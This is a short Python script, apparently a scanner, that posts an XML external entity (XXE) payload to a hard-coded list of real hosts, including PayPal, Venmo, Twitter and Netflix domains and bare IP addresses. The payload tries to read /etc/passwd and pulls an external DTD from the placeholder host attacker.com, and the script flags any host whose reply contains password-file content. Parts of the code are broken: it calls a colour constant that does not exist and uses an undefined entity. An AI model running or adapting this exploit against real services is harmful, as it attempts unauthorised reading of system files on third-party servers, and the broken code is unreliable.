import requests
import xml.etree.ElementTree as ET
from urllib.parse import urlparse
from colorama import init, Fore, Style

# Inicializa colorama para Windows
init()

urls = [
    "https://152.199.54.200",
    "https://152.199.54.201",
    "https://152.195.18.9",
    "https://192.16.48.217",
    "https://192.16.48.237",
    "https://192.16.58.154",
    "https://192.229.194.19",
    "https://192.16.49.142",
    "https://192.16.59.1",
    "https://3.219.220.61",
    "https://3.231.81.109",
    "https://3.229.196.24",
    "https://34.198.70.215",
    "https://44.194.34.103",
    "https://54.85.23.54",
    "https://account.venmo.com",
    "https://amp2.twimg.com",
    "https://apex.glb.paypal.com",
    "https://api-m-v2.sandbox.paypal.com",
    "https://api-m.sandbox.paypal.com",
    "https://api-s-v2.sandbox.paypal.com",
    "https://archive.vine.co",
    "https://art-0.nflximg.net",
    "https://art-1.nflximg.net",
    "https://art-2.nflximg.net",
    "https://art-s.nflximg.net",
    "https://artwork.akam.nflximg.net",
    "https://assets.braintreegateway.com",
    "https://cdn1.venmo.com",
    "https://developer.venmo.com",
    "https://emoji.venmo.com",
    "https://geo0.abs.twimg.com",
    "https://geo2.hca.twimg.com",
    "https://georeu.pbs.twimg.com",
    "https://gu.twimg.com",
    "https://hca.twimg.com",
    "https://js.glb.braintreegateway.com",
]

# Crafted XML payload to test for XXE vulnerability
payload = """
<!DOCTYPE replace [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
%xxe;
]>
<data>&interestingData;</data>
"""

def detect_xxe(url):
    try:
        response = requests.post(url, data=payload, timeout=10)
        if "root:x" in response.text:
            print(f"{Fore.GREEN}[XXE VULNERABILITY DETECTED]{Style.RESET_ALL} {url}")
        else:
            print(f"{Fore.PURPLE}[No XXE Vulnerability]{Style.RESET_ALL} {url}")
    except Exception as e:
        print(f"{Fore.RED}Error occurred for {url}: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    for url in urls:
        detect_xxe(url)
